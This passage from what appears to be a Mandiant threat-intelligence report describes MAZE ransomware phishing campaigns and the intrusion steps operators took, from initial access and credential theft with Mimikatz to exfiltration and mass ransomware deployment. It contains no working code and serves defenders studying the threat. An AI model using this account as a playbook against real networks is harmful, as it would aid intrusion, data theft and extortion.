at organizations in a wide range of industries, with the Financial Services, Healthcare, and Manufacturing sectors being targeted most frequently. These emails were sent using a number of malicious domains created with the registrant address gladkoff1991@yandex.ru.\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 3: German-language lure\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/maze3_olbg.max-1000x1000.png",null,null,"https://storage.googleapis.com/gweb-cloudblog-publish/images/maze3_olbg.max-1000x1000.png"],null,3]]],[null,null,[null,[null,"\u003cp\u003eOn November 8, a campaign delivered Maze primarily to Financial Services and Insurance organizations located in the United states. These emails originated from a compromised or spoofed account and contained an inline link to download a Maze executable payload.\u003c/p\u003e\n\u003cp\u003eOn November 18 and 19, a Maze campaign targeted individuals operating in a range of industries in the United States and Canada with macro documents using phone bill and package delivery themes (Figure 4 and Figure 5). These emails used the subjects “Missed package delivery” and \u0026quot;Your AT\u0026amp;T wireless bill is ready to view\u0026quot; and were sent using a number of malicious domains with the registrant address abusereceive@hitler.rocks. Notably, this registrant address was also used to create multiple Italian-language domains towards the end of November 2019.\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 4: AT\u0026amp;T email lure\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/maze4_jdbj.max-1000x1000.png",null,null,"https://storage.googleapis.com/gweb-cloudblog-publish/images/maze4_jdbj.max-1000x1000.png"],null,3]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 5: Canada Post email lure\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/maze5_spmy.max-1000x1000.png",null,null,"https://storage.googleapis.com/gweb-cloudblog-publish/images/maze5_spmy.max-1000x1000.png"],null,3]]],[null,null,[null,[null,"\u003ch4\u003eShift to Post-Compromise Distribution Maximizes Impact\u003c/h4\u003e\n\u003cp\u003eActors using MAZE have increasingly shifted to deploying the ransomware post-compromise. This methodology provides an opportunity to infect more hosts within a victim’s environment and exfiltrate data, which is leveraged to apply additional pressure on organizations to pay extortion fees. Notably, in at least some cases, the actors behind these operations charge an additional fee, in addition to the decryption key, for the non-release of stolen data.\u003c/p\u003e\n\u003cp\u003eAlthough the high-level intrusion scenarios preceding the distribution of MAZE ransomware are broadly similar, there have been notable variations across intrusions that suggest attribution to distinct teams. Even within these teams, the cyber criminals appear to be task-oriented meaning that one operator is not responsible for the full lifecycle. The following sections highlight the TTPs seen in a subset of incidents and serve to illustrate the divergence that may occur due to the fact that numerous, disparate actors are involved in different phases of these operations. Notably, the time between initial compromise to encryption has also been widely varied, from weeks to many months.\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eInitial Compromise\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eThere are few clear patterns for intrusion vector across analyzed MAZE ransomware incidents. This is consistent with our observations of multiple actors who use MAZE soliciting partners with network access. The following are a sample of observations from several Mandiant incident response engagements:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA user downloaded a malicious resume-themed Microsoft Word document that contained macros which launched an IcedID payload, which was ultimately used to execute an instance of BEACON.\u003c/li\u003e\n\u003cli\u003eAn actor logged into an internet-facing system via RDP. The account used to grant initial access was a generic support account. It is unclear how the actor obtained the account's password.\u003c/li\u003e\n\u003cli\u003eAn actor exploited a misconfiguration on an Internet-facing system. This access enabled the actor to deploy tools to pivot into the internal network.\u003c/li\u003e\n\u003cli\u003eAn actor logged into a Citrix web portal account with a weak password. This authenticated access enabled the actor to launch a Meterpreter payload on an internal system.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cem\u003eEstablish Foothold \u0026amp; Maintain Presence\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eThe use of legitimate credentials and broad distribution of BEACON across victim environments appear to be consistent approaches used by actors to establish their foothold in victim networks and to maintain presence as they look to meet their ultimate objective of deploying MAZE ransomware. Despite these commonplace behaviors, we have observed an actor create their own domain account to enable latter-stage operations.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAcross multiple incidents, threat actors deploying MAZE established a foothold in victim environments by installing BEACON payloads on many servers and workstations.\u003c/li\u003e\n\u003cli\u003eWeb shells were deployed to an internet-facing system. The system level access granted by these web shells was used to enable initial privilege escalation and the execution of a backdoor.\u003c/li\u003e\n\u003cli\u003eIntrusion operators regularly obtained and maintained access to multiple domain and local system accounts with varying permissions that were used throughout their operations.\u003c/li\u003e\n\u003cli\u003eAn actor created a new domain account and added it to the domain administrators group.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cem\u003eEscalate Privileges\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eAlthough Mandiant has observed multiple cases where MAZE intrusion operators employed Mimikatz to collect credentials to enable privilege escalation, these efforts have also been bolstered in multiple cases via use of Bloodhound, and more manual searches for files containing credentials.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eLess than two weeks after initial access, the actor downloaded and interacted with an archive named \u003cem\u003emimi.zip\u003c/em\u003e, which contained files corresponding to the credential harvesting tool Mimikatz. In the following days the same \u003cem\u003emimi.zip\u003c/em\u003e archive was identified on two domain controllers in the impacted environment.\u003c/li\u003e\n\u003cli\u003eThe actor attempted to find files with the word “password” within the environment. Additionally, several archive files were also created with file names suggestive of credential harvesting activity.\u003c/li\u003e\n\u003cli\u003eThe actor attempted to identify hosts running the KeePass password safe software.\u003c/li\u003e\n\u003cli\u003eAcross multiple incidents, the Bloodhound utility was used, presumably to assess possible methods of obtaining credentials with domain administrator privileges.\u003c/li\u003e\n\u003cli\u003eActors primarily used Procdump and Mimikatz to collect credentials used to enable later stages of their intrusion. Notably, both Bloodhound and PingCastle were also used, presumably to enable attackers' efforts to understand the impacted organization's Active Directory configuration. In this case the responsible actors also attempted to exfiltrate collected credentials to multiple different cloud file storage services.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cem\u003eReconnaissance\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eMandiant has observed a broad range of approaches to network, host, data, and Active Directory reconnaissance across observed MAZE incidents. The varied tools and approaches across these incidents maybe best highlights the divergent ways in which the responsible actors interact with victim networks.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIn some intrusions, reconnaissance activity occurred within three days of gaining initial access to the victim network. The responsible actor executed a large number of reconnaissance scripts via Cobalt Strike to collect network, host, filesystem, and domain related information.\u003c/li\u003e\n\u003cli\u003eMultiple built-in Windows commands were used to enable network, account, and host reconnaissance of the impacted environment, though the actors also supplied and used Advanced IP Scanner and Adfind to support this stage of their operations.\u003c/li\u003e\n\u003cli\u003ePreliminary network reconnaissance has been conducted using a batch script named '2.bat' which contained a series of nslookup commands. The output of this script was copied into a file named '2.txt'.\u003c/li\u003e\n\u003cli\u003eThe actor exfiltrated reconnaissance command output data and documents related to the IT environment to an attacker-controlled FTP server via an encoded PowerShell script.\u003c/li\u003e\n\u003cli\u003eOver a period of several days, an actor conducted reconnaissance activity using Bloodhound, PowerSploit/PowerView (Invoke-ShareFinder), and a reconnaissance script designed to enumerate directories across internal hosts.\u003c/li\u003e\n\u003cli\u003eAn actor employed the adfind tool and a batch script to collect information about their network, hosts, domain, and users. The output from this batch script (2adfind.bat) was saved into an archive named 'ad.7z' using an instance of the 7zip archiving utility named \u003cem\u003e7.exe\u003c/em\u003e.\u003c/li\u003e\n\u003cli\u003eAn actor used the tool \u003cem\u003esmbtools.exe \u003c/em\u003eto assess whether accounts could login to systems across the environment.\u003c/li\u003e\n\u003cli\u003eAn actor collected directory listings from file servers across an impacted environment. Evidence of data exfiltration was observed approximately one month later, suggesting that the creation of these directory listings may have been precursor activity, providing the actors with data they may have used to identify sensitive data for future exfiltration.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cem\u003eLateral Movement\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eAcross the majority of MAZE ransomware incidents lateral movement was accomplished via Cobalt Strike BEACON and using previously harvested credentials. Despite this uniformity, some alternative tools and approaches were also observed.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAttackers relied heavily on Cobalt Strike BEACON to move laterally across the impacted environment, though they also tunneled RDP using the ngrok utility, and employed tscon to hijack legitimate rdp sessions to enable both lateral movement and privilege escalation.\u003c/li\u003e\n\u003cli\u003eThe actor moved laterally throughout some networks leveraging compromised service and user accounts obtained from the system on which they gained their initial foothold. This allowed them to obtain immediate access to additional systems. Stolen credentials were then used to move laterally across the network via RDP and to install BEACON payloads providing the actors with access to nearly one hundred hosts.\u003c/li\u003e\n\u003cli\u003eAn actor moved laterally using Metasploit and later deployed a Cobalt Strike payload to a system using a local administrator account.\u003c/li\u003e\n\u003cli\u003eAt least one actor attempted to perform lateral movement using EternalBlue in early and late 2019; however, there is no evidence that these attempts were successful.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cem\u003eComplete Mission\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eThere was evidence suggesting data exfiltration across most analyzed MAZE ransomware incidents. While malicious actors could monetize stolen data in various way (e.g. sale in an underground forum, fraud), actors employing MAZE are known to threaten the release of stolen data if victim organizations do not pay an extortion fee.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAn actor has been observed exfiltrating data to FTP servers using a base64-encoded PowerShell script designed to upload any files with .7z file extensions to a predefined FTP server using a hard-coded username and password. This script appears to be a slight variant of a script first posted to Microsoft TechNet in 2013.\u003c/li\u003e\n\u003cli\u003eA different base64-encoded PowerShell command was also used to enable this functionality in a separate incident.\u003c/li\u003e\n\u003cli\u003eActors deploying MAZE ransomware have also used the utility WinSCP to exfiltrate data to an attacker-controlled FTP server.\u003c/li\u003e\n\u003cli\u003eAn actor has been observed employing a file replication utility and copying the stolen data to a cloud file hosting/sharing service.\u003c/li\u003e\n\u003cli\u003ePrior to deploying MAZE ransomware threat actors employed the 7zip utility to archive data from across various corporate file shares. These archives were then exfiltrated to an attacker-controlled server via FTP using the WinSCP utility.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eIn addition to data theft, actors deploy MAZE ransomware to encrypt files identified on the victim network. Notably, the aforementioned MAZE panel has an option to specify the date on which ransom demands will double, likely to create a sense of urgency to their demands.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFive days after data was exfiltrated from a victim environment the actor copied a MAZE ransomware binary to 15 hosts within the victim environment and successfully executed it on a portion of these systems.\u003c/li\u003e\n\u003cli\u003eAttackers employed batch scripts and a series to txt files containing host names to distribute and execute MAZE ransomware on many servers and workstations across the victim environment.\u003c/li\u003e\n\u003cli\u003eAn actor deployed MAZE ransomware to tens of hosts, explicitly logging into each system using a domain administrator account created earlier in the intrusion.\u003c/li\u003e\n\u003cli\u003eImmediately following the exfiltration of sensitive data, the actors began deployment of MAZE ransomware to hosts across the network. In some cases, thousands of hosts were ultimately encrypted. The encryption process proceeded as follows:\r\n\u003cul\u003e\n\u003cli\u003eA batch script named \u003cem\u003estart.bat\u003c/em\u003e was used to execute a series of secondary batch scripts with names such as \u003cem\u003exaa3x.bat\u003c/em\u003e or \u003cem\u003exab3x.bat\u003c/em\u003e.\u003c/li\u003e\n\u003cli\u003eEach of these batch scripts contained a series of commands that employed the copy command, WMIC, and PsExec to copy and execute a kill script (windows.bat) and an instance of MAZE ransomware (sss.exe) on hosts across the impacted environment\u003c/li\u003e\n\u003cli\u003eNotably, forensic analysis of the impacted environment revealed MAZE deployment scripts targeting ten times as many hosts as were ultimately encrypted.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4\u003eImplications\u003c/h4\u003e\n\u003cp\u003eBased on our belief that the MAZE ransomware is distributed by multiple actors, we anticipate that the TTPs used throughout incidents associated with this ransomware will continue to vary somewhat, particularly in terms of the initial intrusion vector. For more comprehensive recommendations for addressing ransomware, please refer to our \u003ca href\u003d\"https://www.mandiant.com/resources/ransomware-protection-and-containment-strategies\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eRansomware Protection and Containment Strategies\u003c/a\u003e blog post and the linked white paper.\u003c/p\u003e\n\u003ch4\u003eMandiant Security Validation Actions\u003c/h4\u003e\n\u003cp\u003eOrganizations can validate their security controls against more than 20 MAZE-specific actions with Mandiant Security Validation. Please see our Headline Release Content Updates – April 21, 2020 on the Mandiant Security Validation Customer Portal for more information.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA100-877 -
